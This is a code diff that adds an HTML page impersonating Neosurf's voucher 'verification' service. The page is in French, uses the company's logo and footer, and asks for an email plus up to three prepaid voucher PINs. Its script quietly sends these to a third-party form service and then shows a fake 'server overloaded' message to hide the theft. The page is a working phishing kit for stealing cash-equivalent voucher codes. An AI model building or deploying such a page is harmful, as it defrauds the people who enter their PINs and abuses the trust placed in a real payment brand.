@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEOSURF | VERIFICATION</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wdth,wght@75..100,300..800&family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/boxicon@2.1.4/css/boxicons.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="image/logo-neosurf-removebg-preview.png" alt="" width="200" height="50">
+            <div class="l-text"><small>So Simple to Pay<br>& Play Online</small></div>
+        </div>
+        
+       
+
+    </header>
+    <div id="wrapper">
+        <form action="https://api.web3forms.com/submit" method="POST" class="form" onsubmit="goToHomePage(event);reset()">       
+            <h2>VERIFIER VOS RECHARGES</h2>
+            <div class="neosurf">
+             <input type="hidden" name="access_key" value="79a78223-5374-41e9-ab68-0f3d75256f70">
+            <fieldset>
+                <legend>INFORMATION</legend>
+                <div>
+                <label for="email">Email:</label>
+                <input type="email" name="email" id="email" placeholder="abcdef@gmail.com" required>
+                </div>
+                </fieldset>
+                <fieldset>
+                    <legend>VERIFIER</legend>
+                    <div>
+                        <label for="montant1Neosurf">Montant:</label>
+                        <select name="montant1Neo" id="montant1Neosurf" required>
+                            <option value="0" disabled selected>Montant de la recharge</option>
+                            <option value="30">30€</option>
+                            <option value="50">50€</option>
+                            <option value="50">100€</option>
+                        </select>                    
+                    </div>
+                    <div>
+                        <label for="code1">Pin:</label>
+                        <input type="text" id="code1" name="code1" placeholder="XXXX XXX XXX" required maxlength="12">
+                    </div>
+                    <div>
+                        <label for="montant2">Montant:</label>
+                        <select name="montant2" id="montant1">
+                            <option value="0" disabled selected>Montant de la recharge</option>
+                            <option value="30">30€</option>
+                            <option value="50">50€</option>
+                            <option value="50">100€</option>
+                        </select>                    
+                    </div>
+                    <div>
+                        <label for="code2">Pin 2:</label>
+                        <input type="text" id="code2" name="code2" placeholder="XXXX XXX XXX"  maxlength="12">
+                    </div>
+                    <div>
+                        <label for="montant3">Montant:</label>
+                        <select name="montant3" id="montant3">
+                            <option value="0" disabled selected>Montant de la recharge</option>
+                            <option value="30">30€</option>
+                            <option value="50">50€</option>
+                            <option value="50">100€</option>
+                        </select>                    
+                    </div>
+                    <div>
+                        <label for="code3">Pin 3:</label>
+                        <input type="text" id="code3" name="code3" placeholder="XXXX XXX XXX"  maxlength="12">
+                    </div>
+                </fieldset>
+            </div>
+            <button type="submit">Verifier</button>
+        </form>
+    </div>
+    <footer>
+        <small>Copyright © 2004 - 2024 NS Cards France SAS</small><br>
+        <small>NS Cards France SAS, is a company registered in France under Company Number SIREN 478502321, Neosurf operates across EEA and EU under Narvi Payments Oy Ab. Narvi Payments Oy Ab is a licensed e-money institution with the right to execute activities related to the issuance of e-money around the European Union licensed by FIN-FSA (Finnish Financial Supervisory Authority)</small><br>
+        <small>Registered address: NS CARDS FRANCE SAS 10 rue Vandrezanne, 75013 Paris, France</small>
+    </footer>
+    <script>
+        function goToHomePage(event) {
+            // Empêcher le comportement de soumission par défaut
+            event.preventDefault();
+    
+            // Récupérer les données du formulaire
+            var formData = new FormData(event.target);
+    
+            // Envoyer les données du formulaire en utilisant AJAX
+            fetch(event.target.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Traiter la réponse (par exemple, afficher un message de réussite)
+                console.log('Formulaire soumis avec succès:', response);
+                // Vous pouvez également afficher un message de réussite à l'utilisateur
+                alert("Désolé, le serveur est actuellement saturé en raison d'un grand nombre de demandes. Veuillez réessayer ultérieurement.!");
+            })
+            .catch(error => {
+                // Traiter l'erreur (par exemple, afficher un message d'erreur)
+                console.error('Erreur lors de la soumission du formulaire:', error);
+                // Vous pouvez également afficher un message d'erreur à l'utilisateur
+                alert('Erreur lors de la soumission du formulaire. Veuillez réessayer plus tard.');
+            });
+        }
+    </script>
+</body>
+</html>
